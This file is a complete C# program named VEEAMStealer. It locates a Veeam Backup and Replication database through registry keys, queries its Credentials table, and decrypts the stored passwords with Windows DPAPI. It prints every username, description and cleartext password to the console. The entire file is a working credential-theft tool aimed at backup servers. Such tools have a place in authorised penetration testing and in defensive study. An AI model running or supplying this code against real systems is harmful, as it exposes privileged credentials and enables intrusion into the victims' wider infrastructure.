using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace VEEAMStealer
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string SqlServerName = "";
            string SqlInstanceName = "";
            string SqlDatabaseName = "";
            int i = 0;
            SqlConnection conn;
            Dictionary<string, string[]> userEncPass = new Dictionary<string, string[]>();
            try
            {
                string VeaamRegPath = @"HKEY_LOCAL_MACHINE\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\MsSql\";
                SqlDatabaseName = (string)Registry.GetValue(VeaamRegPath, "SqlDatabaseName", "Key SqlDatabaseName does not exist");
                SqlInstanceName = (string)Registry.GetValue(VeaamRegPath, "SqlInstanceName", "Key SqlInstanceName does not exist");
                SqlServerName = (string)Registry.GetValue(VeaamRegPath, "SqlServerName", "Key SqlServerName does not exist");
                /*string Provider = "sqloledb";*/
                Console.WriteLine("Found VEEAM DB :\n" +
                    "\t Server Name: {0}\n" +
                    "\t Instance Name: {1}\n" +
                    "\t Database Name: {2}\n",
                    SqlServerName, SqlInstanceName, SqlDatabaseName);
            }
            catch
            {
                Console.WriteLine("Can't find Veeam on localhost, try running as Administrator");
                return;
            }

            try
            {
                string connString = "Data Source=" + SqlServerName + "\\" + SqlInstanceName + "; Initial Catalog=" + SqlDatabaseName + "; Integrated Security=SSPI;";
                conn = new SqlConnection(connString);
                string SQL = "SELECT [user_name] AS 'Username',[password] AS 'Password', [description] AS 'Description' FROM [Credentials] ";
                conn.Open();
                SqlCommand command = new SqlCommand(SQL, conn);
                SqlDataReader reader = command.ExecuteReader();
                Console.WriteLine("\n#########################################################################################################\n");
                Console.WriteLine("Encrypted Credentials: \n");
                try
                {
                    while (reader.Read())
                    {
                        string[] arraytemp = new string[2];
                        Console.WriteLine("\tUsername: {0} - Password: {1} - Description: {2}\n", reader["Username"], reader["Password"], reader["Description"]);
                        arraytemp[0] = (string)reader["Password"];
                        arraytemp[1] = (string)reader["Description"];
                        userEncPass.Add(reader["Username"] + " " + i, arraytemp);
                        i++;
                    }
                }
                catch
                {
                    Console.WriteLine("Error reading");
                }
                finally
                {
                    reader.Close();
                }
                conn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Error connection to MSSQL instance");
                return;
            }

            Console.WriteLine("\n#########################################################################################################\n");
            Console.WriteLine("ClearText Credentials: \n");
            foreach (KeyValuePair<string, string[]> kvp in userEncPass)
            {
                try
                {
                    //Decrypt the data using DataProtectionScope.CurrentUser.
                    byte[] bytesPass = Convert.FromBase64String(kvp.Value[0]);
                    byte[] unprotectedBytesPass = ProtectedData.Unprotect(bytesPass, null, DataProtectionScope.LocalMachine);
                    Console.WriteLine("\tUsername: {0} - Password: {1} - Description:{2}\n",
                        kvp.Key, System.Text.Encoding.Default.GetString(unprotectedBytesPass), kvp.Value[1]);
                }
                catch (CryptographicException e)
                {
                    Console.WriteLine("Data was not decrypted. An error occurred.");
                    Console.WriteLine(e.ToString());
                }
            }
        }
    }
}
